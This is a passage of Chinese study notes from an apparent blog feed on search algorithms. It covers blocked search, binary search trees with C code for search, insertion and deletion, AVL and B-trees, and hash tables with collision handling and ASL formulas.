stretchy="false">)</mo><mo>+</mo><mfrac><mi>s</mi><mn>2</mn></mfrac><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo>&gt;</mo><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo>≤</mo><mi>A</mi><mi>S</mi><msub><mi>L</mi><mrow><mi>b</mi><mi>s</mi></mrow></msub><mo>≤</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ASL≈log_2 (\frac{n}{s}+1) +\frac{s}{2}   ····&gt;(log_2 n\leq ASL_{bs}\leq\frac{n+1}{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.7936em;vertical-align:-0.686em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.7936em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">⋅⋅⋅⋅</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></span></p><p>s：每块内部的记录个数，n/s即为块的数目</p></li></ul><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">顺序查找</th><th style="text-align:center">折半查找</th><th style="text-align:center">分块查找</th></tr></thead><tbody><tr><td style="text-align:center">ASL</td><td style="text-align:center">最大</td><td style="text-align:center">最小</td><td style="text-align:center">中间</td></tr><tr><td style="text-align:center">表结构</td><td style="text-align:center">有序表、无序表</td><td style="text-align:center">有序表</td><td style="text-align:center">分块有序</td></tr><tr><td style="text-align:center">存储结构</td><td style="text-align:center">顺序表、线性表</td><td style="text-align:center">顺序表</td><td style="text-align:center">顺序表、线性表</td></tr><tr><td style="text-align:center">查找时间复杂度</td><td style="text-align:center">O(n)</td><td style="text-align:center">O(log~2~ n)</td><td style="text-align:center">与确定所在块的查找方法有关</td></tr><tr><td style="text-align:center">特点</td><td style="text-align:center">算法简单 ， 对表结构无任何要求，但查找效率较低</td><td style="text-align:center">对表结构要求较高 ， 查找效率较高</td><td style="text-align:center">对表结构有一定要求， 查找效率介于折半查找和顺序查找之间</td></tr><tr><td style="text-align:center">适用情况</td><td style="text-align:center">任何结构的线性表，不经常做插入和删除</td><td style="text-align:center">有序的顺序表，不经常做插入和删除</td><td style="text-align:center">块间有序、块内无序的顺序表， 经常做插入和删除</td></tr></tbody></table><h3 id="🔍树表的查找">🔍树表的查找</h3><ul><li><p>表结构在查找过程中动态生成，对于给定值key若表中存在，则成功返回；否则插入关键字等于key的记录</p></li><li><p>二叉排序树:deciduous_tree: :</p><ul><li><p>二叉排序树或是空树，或是满足如下性质的二叉树：(右均小，左均大)</p><p>:one: 若其左子树非空，则左子树上所有结点的值 均小于根结点的值</p><p>:two: 若其右子树非空，则右子树上所有结点的值 均大于根结点的值</p><p>:three: 其左右子树本身又各是一棵二叉排序树</p></li><li><p>对二叉排序树进行<strong>中序</strong>遍历：得到一个<strong>关键字</strong>的<strong>递增有序</strong>序列</p> <img src="/2024/02/19/%E6%9F%A5%E6%89%BE/121248.jpg" class=""></li><li><p>算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//二叉排序树的二叉链表存储表示</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>KeyType key;<span class="hljs-comment">//关键字项</span><br>InfoType otherinfo;<span class="hljs-comment">//其他数据项</span><br>&#125;ElemType;<span class="hljs-comment">//每个结点的数据域类型</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSTNode</span></span><br><span class="hljs-class">&#123;</span><br>ElemType data;  <span class="hljs-comment">//每个结点的数据域包括关键字项和其他数据项</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BSTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><span class="hljs-comment">//左右孩子指针</span><br>&#125;BSTNode,*BSTree;<br></code></pre></td></tr></table></figure><ul><li>查找:star: ：</li></ul><p>（1）若二叉排序树为空，则查找失败，返回空指针</p><p>（2）若二叉排序树非空，将给定值key与根结点的关键字T-&gt;data.key进行比较：</p><p>​ :one: 若key等于T-&gt;data.key，则查找成功，返回根结点地址</p><p>​ :two: 若key小于T-&gt;data.key，则进一步查找左子树</p><p>​ :three: 若key大于T-&gt;data.key，则进一步查找右子树。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">BSTree <span class="hljs-title function_">SearchBST</span><span class="hljs-params">(BSTree T, KeyType key)</span><br>&#123;<br><span class="hljs-keyword">if</span> ((!T) || key == T-&gt;data.key)<span class="hljs-keyword">return</span> T;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &lt; T-&gt;data.key)<span class="hljs-keyword">return</span> SearchBST(T-&gt;lchild, key);<span class="hljs-comment">//在左子树中继续查找</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> SearchBST(T-&gt;rchild, key);<span class="hljs-comment">//在右子树中继续查找</span><br>&#125;<br></code></pre></td></tr></table></figure><p>:small_orange_diamond:<strong>时间复杂度：O(log~2~ n)</strong></p><p>:small_orange_diamond:ASL平均查找长度：</p><p>平均查找长度和二叉树的形态有关(n!棵二叉排序树，其中有形态相同的)：若等概，即：</p><p>最好：ASL = log2 (n+1)-1  <strong>O(log~2~ n)</strong> （形态匀称，与二分查找的判定树相似）</p><p>最坏: ASL=(n+1)/2  <strong>O(n)</strong> （单支树，与顺序查找相似）</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/124629.jpg" class=""><ul><li>插入:star: ：</li></ul><p>若二叉排序树为空，则插入结点应为根结点否则，继 续在其左、右子树上查找</p><p>树中已有，不再插入</p><p>树中没有，查找直至某个叶子结点的左子树或右子树为空为止，则插入结点应为该叶子结点的左孩子或右孩子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//二叉排序树的插入👀</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertBST</span><span class="hljs-params">(BSTree &amp;T, ElemType e)</span><br>&#123;<br><span class="hljs-comment">//当二叉排序树 T中不存在关键字等千e.key的数据元素时， 则插入该元素</span><br><span class="hljs-keyword">if</span> (!T)<span class="hljs-comment">//找到插入位置 ， 递归结束</span><br>&#123;<br>BSTree S = new BSTNode;   <span class="hljs-comment">//生成新结点*S</span><br>S-&gt;data = e;                 <span class="hljs-comment">//新结点*S的数据域置为e</span><br>S-&gt;lchild = S-&gt;rchild = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//新结点*S作为叶子结点</span><br>T = S;                   <span class="hljs-comment">//把新结点*S链接到已找到的插入位置</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.key &lt; T-&gt;data.key)<br>InsertBST(T-&gt;lchild, e);<span class="hljs-comment">//将*S插入左子树</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.key &gt; T-&gt;data.key)<br>InsertBST(T-&gt;rchild, e);   <span class="hljs-comment">//将*S插入左子树</span><br>&#125;<br></code></pre></td></tr></table></figure><p>:small_orange_diamond:<strong>时间复杂度：O(log~2~ n)</strong></p><p><strong>插入的元素一定在叶结点上</strong></p><ul><li><p>生成:star: ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">CreatBST</span><span class="hljs-params">(BSTree &amp;T)</span><br>&#123;<span class="hljs-comment">//依次读人一个关键字为key的结点， 将此结点插人二叉排序树T中</span><br><span class="hljs-type">int</span> ENDFLAG = <span class="hljs-number">-1</span>;<br>T = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//将二叉排序树T初始化为空树</span><br><span class="hljs-built_in">cin</span> &gt;&gt; e;<br><span class="hljs-keyword">while</span> (e.key != ENDFLAG)   <span class="hljs-comment">//ENDFLAG为自定义常址，作为输入结束标志</span><br>&#123;<br>InsertBST(T, e);   <span class="hljs-comment">//将此结点插入二叉排序树T中</span><br><span class="hljs-built_in">cin</span> &gt;&gt; e;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>:small_orange_diamond:<strong>时间复杂度O(nlog~2~ n)</strong></p><p>空树·····&gt;查找·····&gt;插入·····&gt;二叉排序树</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/121521.jpg" class=""><p>不同插入次序的序列生成不同形态的二叉排序树</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/121917.jpg" class=""></li><li><p>删除:star: ：</p><p>1、不能把以该结点为根的子树都删去，只能删掉该结点，并且还应保证删除后所得的二叉树仍然满足二叉排序树的性质不变</p><p>2、由于中序遍历二叉排序树可以得到一个递增有序的序列 。那么，在二叉排序树中删去一个结点相当于删去有序序列中的一个结点</p><p>3、将因删除结点而断开的二叉链表重新链接起来；防止重新链接后树的高度增加</p><p>:one: 删除<strong>叶结点</strong>，只需将其双亲结点指向它的指针清零，再释放它即可</p><p>:two: 被删结点<strong>缺右子树</strong>，可以拿它的<strong>左子树</strong>结点替换它的位置，再释放它</p><p>:three: 被删结点<strong>缺左子树</strong>，可以拿它的<strong>右子树</strong>结点替换它的位置，再释放它</p><p>:four: 被删结点<strong>左、右子树</strong>都存在，可以找到它在<strong>中序序列</strong>中的<strong>前驱</strong>（或<strong>后继</strong>）,用对应的值<strong>填补</strong>到被删结点中，再来处理这个结点的删除问题</p><p>:bulb: 相当于：独子则替，双全则左长右么（前驱为左子树中最大者，后继为右子树中最小者）</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/124058.jpg" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">DeleteBST</span><span class="hljs-params">(BSTree &amp;T, KeyType key)</span><br>&#123;<span class="hljs-comment">//从二叉排序树 T 中删除关键字等于 key 的结点</span><br>BSTree p,f,q,s;<br>p = T; f = <span class="hljs-literal">NULL</span>;    <span class="hljs-comment">//初始化</span><br><span class="hljs-comment">//下面的 while 循环从根开始查找关键字等于 key 的结点*p</span><br><span class="hljs-keyword">while</span> (p)<br>&#123;<br><span class="hljs-keyword">if</span> (p-&gt;data.key == key) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">//找到关键字等于 key 的结点*p, 结束循环</span><br>f = p;    <span class="hljs-comment">//*f 为*p 的双亲结点</span><br><span class="hljs-keyword">if</span> (p-&gt;data.key &gt; key) p = p-&gt;lchild;<br><span class="hljs-keyword">else</span> p = p-&gt;rchild;<br>&#125;<br><span class="hljs-keyword">if</span> (!p) <span class="hljs-keyword">return</span>;    <span class="hljs-comment">//找不到被删结点则返回</span><br><br><span class="hljs-comment">//考虑3种情况实现p 所指子树内部的处理： *p 左右子树均不空、 无右子树、 无左子树</span><br><span class="hljs-keyword">if</span> ((p-&gt;lchild) &amp;&amp; (p-&gt;rchild))    <span class="hljs-comment">//被删结点*p 左右子树均不空</span><br>&#123;<br>q = p; s = p-&gt;lchild;<br><span class="hljs-keyword">while</span> (s-&gt;rchild)    <span class="hljs-comment">//在*p 的左子树中继续查找其前驱结点，即最右下结点</span><br>&#123;<br>q = s; s = s-&gt;rchild;    <span class="hljs-comment">//向右到尽头</span><br>&#125;<br>p-&gt;data = s-&gt;data;    <span class="hljs-comment">//s 指向被删结点的 “前驱＂</span><br><span class="hljs-keyword">if</span> (q != p) q-&gt;rchild = s-&gt;lchild;  <span class="hljs-comment">//重接*q 的右子树</span><br><span class="hljs-keyword">else</span> q-&gt;lchild = s-&gt;lchild;    <span class="hljs-comment">//重接*q 的左子树</span><br>delete s;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!p-&gt;rchild)    <span class="hljs-comment">//被删结点*p无右子树,只需重接其左子树</span><br>&#123;<br>q = p; p = p-&gt;lchild;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!p -&gt; lchild)    <span class="hljs-comment">//I被删结点*p无左子树，只需重接其右子树</span><br>&#123;<br>q = p; p = p-&gt;rchild;<br>&#125;<br><br><span class="hljs-comment">//将 p 所指的子树挂接到其双亲结点*f 相应的位置</span><br><span class="hljs-keyword">if</span> (!f) T = p; <span class="hljs-comment">//被删结点为根结点</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (q == f-&gt;lchild) f-&gt;lchild = p;   <span class="hljs-comment">//挂接到*f 的左子树位置</span><br><span class="hljs-keyword">else</span> f-&gt;rchild = p;    <span class="hljs-comment">//挂接到*f 的右子树位置</span><br>delete q;<br>&#125;<br></code></pre></td></tr></table></figure><p>:small_orange_diamond:<strong>时间复杂度O(log~2~ n)</strong></p></li></ul></li></ul></li><li><p>平衡二叉树(AVL):deciduous_tree: :star:</p><p>树的高度越小，查找速度越快</p><ul><li><p>空树或①左、右子树是平衡二叉树②所有结点的<strong>左、右</strong>子树<strong>深度</strong>之差的<strong>绝对值</strong>≤ 1</p></li><li><p>二叉树上<strong>结点</strong>的<strong>平衡因子</strong>（BF，Balance Factor）：该结点<strong>左子树</strong>的<strong>深度</strong>减去它的<strong>右子树</strong>的<strong>深度</strong>（ALV树的任一结点的平衡因子只能取-1、0或1）</p></li><li><p>对于一棵有n个结点的AVL树，其<strong>高度</strong>保持在**O(log~2~n)<strong>数量级，<strong>ASL</strong>也保持在</strong>O(log~2~n)**量级</p></li><li><p>插入时可能失衡，须重新调整树的结构</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/132222.jpg" class=""></li></ul></li></ul><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/155610.jpg" class=""><h6 id="外查找算法">外查找算法</h6><ul><li>在计算机中，存储器的层次结构一般分为：CPU寄存器、内存 、外存</li><li>内查找算法：用于可以存储在计算机<strong>内存</strong>中<strong>较小</strong>的文件（以<strong>结点</strong>为单位进行查找）</li><li>外查找算法：指在<strong>外存设备空间</strong>进行数据查找</li><li>B-树是一种<strong>平衡、有序、多路、动态</strong>的查找树，它是<strong>磁盘</strong>文 件系统中索引技术常用的一种数据结构形式，如磁盘管理系统中的<strong>目录</strong>管理以及数据文件中的<strong>索引</strong>机构大多采用B-树：空树or<ul><li>树中每个结点至多有m棵子树</li><li>若<strong>根结点</strong>不是叶子结点，则至少有<strong>两棵</strong>子树</li><li>除根之外的所有<strong>非终端结点</strong>至少有<strong>m/2</strong>棵子树</li><li>所有的<strong>非终端结点</strong>中包含下列信息数据：（n, P~0~ , K~1~ , P~1~ , K~2~ , P~2~ , …, K~n~ , P~n~）<ul><li>K~i~ (i=1, …, n)为<strong>关键字</strong>，且K~i~&lt;K~i~+1(i=1, …, n-1)</li><li>P~i~ (i=0, …, n)为指向<strong>子树根结点</strong>的指针，且指针<strong>P~i-1~<strong>所指子树中所有结点的关键字均</strong>小于</strong>K~i~ (i=1, …,  n)</li><li>P~n~所指子树中所有结点的关键字均大于K~n~，n([m/2]-1≤n≤m-1)为关键字的个数（或n+1为子树个数）</li></ul></li><li><strong>所有</strong>的<strong>叶子</strong>结点都出现在<strong>同一层次</strong>上，并且<strong>不带信息</strong></li></ul></li></ul><h3 id="🔍散列表的查找（散列查找法or哈希查找法）">🔍散列表的查找（散列查找法or哈希查找法）</h3><ul><li><p>基本思想：在记录的关键字与记录的存储地址之间建立一种对应关系，p = H(key) ，即<strong>散列函数</strong></p></li><li><p>优点：在冲突未出现时，查找速度极快<strong>O(1)</strong>, 查找效率与元素个数n<strong>无关</strong></p></li><li><p>根据散列函数计算散列地址：H（k）＝k，找到则访问对应地址；若查不到，则返回一个特殊值，如空指针或空记录</p></li><li><p>冲突：不同的关键字映射到同一个散列地址</p></li><li><p>同义词：具有相同散列函数值的两个关键字</p></li><li><p>散列表：一个<strong>有限连续</strong>的地址空间，用以存储按散列函数计算得到相应散列地址的数据记录。通常散列表的存储空间是一个<strong>一维数组</strong>，<strong>散列地址</strong>是数组的<strong>下标</strong></p><ul><li>散列函数的构造简单</li><li>均匀（指发生冲突的可能性尽可能最少）</li><li>直接定址法、数字分析法、平方取中法、折叠法、<strong>除留余数法</strong>、随机数法</li></ul></li><li><p>除留余数法:star:</p><ul><li>H(key)=key mod p (p是一个整数)</li><li>设表长为m，一般情况下可以选p为小于表长的最大质数</li></ul></li><li><p>处理冲突的方法：</p><img src="/2024/02/19/%E6%9F%A5%E6%89%BE/201749.jpg" class=""><ul><li><p>开放地址法</p><p>有冲突时就去寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到，并将数据元素存入</p><ul><li><p>线性探测法:star:</p><p>1、H~i~ =(Hash(key)+d~i~ ) mod m ( 1≤i &lt; m ) 其中：m为散列表长度d~i~为增量序列1，2，…m-1，且d~i~ =i</p><p>2、即进行+1</p><p>3、可能使第i个散列地址的同义词存入第i+1个地址，这样本应存入第i+1 个散列地址的元素变成了第i+2个散 列地址的同义词，……，产生**“聚集”**现象，降低查找效率（不符合可持续发展）</p></li><li><p>二次探测法:star:</p><p>设：散列函数为Hash(key)=key mod 11</p><p>H~i~ =(Hash(key)+d~i~ ) mod m 其中：m为散列表长度，m要求是某个4k+3的质数，设m=11； di为增量序列 1^2^，-1^2^，2^2^ ，-2^2^ ，…，q^2^ ，-q^2^（q&lt;=m/2)</p></li><li><p>伪随机探测法</p><p>H~i~ =(Hash(key)+d~i~ ) mod m ( 1≤i &lt; m ) 其中：m为散列表长度 d~i~ 为随机数</p></li></ul></li><li><p>链地址法:star:</p><ul><li>相同散列地址的记录链成一单链表，m个散列地址 就设m个单链表，然后用一个数组将m个单链表的表头指针存 储起来，形成一个动态的结构</li><li>链地址法的优点： 非同义词不会冲突，无“聚集”现象；链表上结点空间动态申请，更适合于<strong>表长不确定</strong>的情况</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//散列表的查找</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>KeyType key;<br>InfoType otherinfo;<br>&#125;HashTable[m];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NULLKEY 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> m 20</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">SearchHash</span><span class="hljs-params">(HashTable HT, KeyType key)</span><br>&#123;<span class="hljs-comment">//在散列表 HT中查找关键字为key的元素，若查找成功， 返回散列表的单元标号，否则返回 - 1</span><br><br><span class="hljs-type">int</span> HO = H(key);<span class="hljs-comment">//根据散列函数H(key)计算散列地址</span><br><span class="hljs-type">int</span> Hi,i;<br><span class="hljs-keyword">if</span> (HT[HO].key == NULLKEY) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">//若单元HO为空， 则所查元素不存在</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (HT[HO].key == key) <span class="hljs-keyword">return</span> HO; <span class="hljs-comment">//若单元HO中元素的关键字为key, 则查找成功</span><br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; m; ++i)<br>&#123;<br>Hi = (HO + i) % m; <span class="hljs-comment">//按照线性探测法计算下一个散列地址Hi</span><br><span class="hljs-keyword">if</span> (HT[Hi].key == NULLKEY) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">//若单元肛为空， 则所查元素不存在</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (HT[Hi].key == key) <span class="hljs-keyword">return</span> Hi; <span class="hljs-comment">//若单元肛中元素的关键字为key, 则查找成功</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>         <br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>查找效率分析(:star:ASL、α )</p><ul><li><p>ASL取决于：散列函数、处理冲突的方法、散列表的装填因子</p></li><li><p><strong>α = 表中填入的记录数 / 散列表的长度</strong>。α越大，表中记录数越多， 说明表装得越满，发生冲突的可能性就越大，查找时比较次数就越多</p></li><li><p>ASL与装填因子有关，既不是严格的O(1)，也不是O(n)</p></li><li><table><thead><tr><th></th><th>链地址法</th><th>线性探测法</th><th>随机探测法</th></tr></thead><tbody><tr><td>ASL(成功)</td><td>1+α/2</td><td>1/2 · (1+1/(1-α))</td><td>-1/α · ln(1-α)</td></tr><tr><td>ASL(失败)</td><td>α+e^-α^</td><td>1/2 · (1+1/(1-α)^2^)</td><td>1/(1-α)</td></tr></tbody></table></li></ul></li></ul><table><thead><tr><th></th><th>开放地址法</th><th>链地址法</th></tr></thead><tbody><tr><td>空间</td><td>无指针域，存储效率较高</td><td>附加指针域，存储效率较低</td></tr><tr><td>（时间）查找</td><td>有二次聚集现象， 查找效率较低</td><td>无二次聚集现象， 查找效率较高</td></tr><tr><td>（时间）插入、删除</td><td>不易实现</td><td>易千实现</td></tr><tr><td>适用情况</td><td>表的大小固定， 适于表长无变化的情况</td><td>结点动态生成， 适于表长经常变化的情况</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-排序</title>
    <link href="/2024/02/19/%E6%8E%92%E5%BA%8F/"/>
    <url>/2024/02/19/%E6%8E%92%E5%BA%8F/</url>
    
